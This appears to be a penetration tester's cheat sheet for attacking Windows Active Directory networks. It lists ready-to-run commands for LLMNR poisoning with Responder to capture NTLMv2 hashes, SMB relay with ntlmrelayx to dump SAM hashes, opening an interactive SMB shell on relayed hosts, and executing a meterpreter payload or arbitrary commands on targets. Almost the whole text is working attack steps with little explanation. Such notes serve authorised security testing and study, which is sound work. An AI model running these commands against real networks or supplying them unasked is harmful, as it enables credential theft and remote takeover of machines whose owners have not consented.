### Active Directory

#### LLMNR Poisoning
```
# Linked Local Multi-cast Name Resolution Poisoning using Impacket tool, Responder.
# Run this first thing, even before as it will capture generated traffic.

# Capture NTLMv2 Hash with Responder. Start listening for events
responder -I eth0 -rdw
```

#### SMB Relay. User must be admin on both machines.
```
# SMB signing must be disabled.
nmap --script=smb2-security-mode.nse -p445 <ip>

# Set /usr/share/responder/Responder.conf SMB=Off HTTP=Off. Then run
responder -I eth0 -rdw

# Add IP's from nmap to targets.txt. Run the relay and wait for an event to happen
# It will return the SAM hashes
python ntlmrelayx.py -tf targets.txt -smb2support
```

#### SMB Relay to an SMB Shell
```
# As above, except for ntlmrelayx
python ntlmrelayx.py -tf targets.txt -smb2support -I

# Once the event is triggered, an interactive SMB shell will be created at an ip eg. 127.0.0.1:11000
nc 127.0.0.1 11000

# Can then use SMB share commands to interact
help
shares
use ADMIN$
ls
```

#### Other SMB Relay ntlmrelayx options
```
# Create a meterpreter shell and execute
python ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe

# Execute a command
python ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```